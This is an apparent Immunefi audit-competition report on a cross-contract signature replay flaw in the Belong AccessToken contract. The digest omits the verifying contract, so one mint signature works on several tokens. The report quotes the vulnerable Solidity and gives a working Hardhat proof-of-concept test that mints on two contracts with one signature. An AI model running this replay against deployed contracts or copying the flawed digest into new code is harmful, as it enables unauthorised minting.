# 57388 sc medium cross contract signature replay because verifying contract is not included in the digest

**Submitted on Oct 25th 2025 at 18:07:06 UTC by @kaysoft for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57388
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/tokens/AccessToken.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

A user can use just one signature to call `mintStaticPrice(...)` on multiple AccessTokens to mint NFTs.

This is because the verifying contract is not included in the signed digest.

## Vulnerability Details

Signature verification on the codebase is not EIP-712 compliant because it fails to include the verifying contract (and other contextual data) in the digest that is signed.

Even the `SignatureCheckerLib.sol` that `isValidSignatureNow(...)` uses for signature verification has a warning at the top:

> Use EIP-712 for the digest to prevent replay attacks across different chains and contracts.

Currently signature verification includes blockchain ids in the digest and verification which will prevent cross-chain replay attacks but does not include the particular contract that will verify the signature in the signed digest.

This allows any user with a signature meant for a particular AccessToken to be able to mint on other AccessTokens that the user does not have signatures for.

There will be multiple AccessTokens and a signature is supposed to be meant for a particular accessToken since its token URI and other metadata are unique to the access token, but with cross-contract signature replay it is possible to reuse one signature across different AccessTokens.

Example from the codebase:

File: AccessToken.sol

```solidity
function mintStaticPrice(
        address receiver,
        StaticPriceParameters[] calldata paramsArray,
        address expectedPayingToken,
        uint256 expectedMintPrice
    ) external payable expectedTokenCheck(expectedPayingToken) nonReentrant {
        Factory.FactoryParameters memory factoryParameters = parameters.factory.nftFactoryParameters();

        require(paramsArray.length <= factoryParameters.maxArraySize, WrongArraySize());

        AccessTokenInfo memory info = parameters.info;

        uint256 amountToPay;
        for (uint256 i; i < paramsArray.length; ++i) {
            factoryParameters.signerAddress.checkStaticPriceParameters(receiver, paramsArray[i]);

            uint256 price = paramsArray[i].whitelisted ? info.whitelistMintPrice : info.mintPrice;

            unchecked {
                amountToPay += price;
            }

            _baseMint(paramsArray[i].tokenId, receiver, paramsArray[i].tokenUri);
        }

        require(_pay(amountToPay, expectedPayingToken) == expectedMintPrice, PriceChanged(expectedMintPrice));
    }
```

As can be seen below, the verifying contract is not included in the digest which makes a single signature usable on multiple different AccessTokens.

File: SignatureVerifyer.sol

```solidity
function checkStaticPriceParameters(address signer, address receiver, StaticPriceParameters calldata params)
        external
        view
    {
        require(
            signer.isValidSignatureNow(//@audit verifying contract not included in digest
                keccak256(
                    abi.encodePacked(receiver, params.tokenId, params.tokenUri, params.whitelisted, block.chainid)
                ),
                params.signature
            ),
            InvalidSignature()
        );
    }
```

## Impact Details

A user with a signature to mint from one AccessToken with the `mintStaticPrice(...)` function can use the same signature to mint from other AccessTokens.

## References

Consider ensuring signature verification is EIP-712 compliant as warned in `SignatureCheckerLib.sol`.

> Use EIP-712 for the digest to prevent replay attacks across different chains and contracts.

## Proof of Concept

{% stepper %}
{% step %}

### Proof of Concept (setup & deploy)

1. Copy and paste the test below to the `accessToken.test.ts` file in the `'Withdraw test'` test suite.
2. Run `yarn test`

The test demonstrates that a user can use a signature meant for `accessTokenEth1` to mint an NFT from both `accessTokenEth1` and `accessTokenEth2`.
{% endstep %}

{% step %}

### Proof of Concept (test body)

```solidity
it('Cross contract signature replay attack:kaysoft', async () => {
      const { creator, signer, factory, owner, referral, charlie, referralCode } = await loadFixture(
        fixture,
      );

      //1. Produce accessTokenEth1
      AccessTokenEthMetadata.name += '007';
      const { accessToken: accessTokenEth1, royaltiesReceiver: royaltiesReceiver1 } = await deployAccessToken(
        AccessTokenEthMetadata,//@audit same metadata used for hashed salt
        ethPurchasePrice,
        ethPurchasePrice.div(2),
        signer,
        charlie,
        factory,
        ethers.constants.HashZero,
      );

      //2. Produce accessTokenEth2
      AccessTokenEthMetadata.name += '123';
      const { accessToken: accessTokenEth2, royaltiesReceiver: royaltiesReceiver2 } = await deployAccessToken(
        AccessTokenEthMetadata,
        ethPurchasePrice,
        ethPurchasePrice.div(2),
        signer,
        creator,
        factory,
        ethers.constants.HashZero,
      )

      //3. Prepare the message for accessTokenEth1
      let message = EthCrypto.hash.keccak256([
        { type: 'address', value: creator.address },
        { type: 'uint256', value: 0 },
        { type: 'string', value: NFT_721_BASE_URI },
        { type: 'bool', value: true },
        { type: 'uint256', value: chainId },
      ]);


       //4. Sign message for just accessTokenEth1
      let signature = EthCrypto.sign(signer.privateKey, message);


      //5. User calls mintStaticPrice() on accessTokenEth1 with signature
      await accessTokenEth1.connect(creator).mintStaticPrice(
        creator.address,
        [
          {
            tokenId: 0,
            tokenUri: NFT_721_BASE_URI,
            whitelisted: true,
            signature,
          } as StaticPriceParametersStruct,
        ],
        NATIVE_CURRENCY_ADDRESS,
        ethPurchasePrice.div(2),
        {
          value: ethPurchasePrice.div(2),
        },
      );

      //6. User calls mintStaticPrice() on accessTokenEth2 with same signature meant for accessTokenEth1
      await accessTokenEth2.connect(creator).mintStaticPrice(
        creator.address,
        [
          {
            tokenId: 0,
            tokenUri: NFT_721_BASE_URI,
            whitelisted: true,
            signature,
          } as StaticPriceParametersStruct,
        ],
        NATIVE_CURRENCY_ADDRESS,
        ethPurchasePrice.div(2),
        {
          value: ethPurchasePrice.div(2),
        },
      );

      //7. Now creator owns NFTs with id 0 on both accessTokenEth1 and accessTokenEth2
      //Gotten with a single signature meant for only accessTokenEth1
      expect(await accessTokenEth1.ownerOf(0)).to.be.equal(creator.address);
      expect(await accessTokenEth2.ownerOf(0)).to.be.equal(creator.address);
    })
```

{% endstep %}
{% endstepper %}
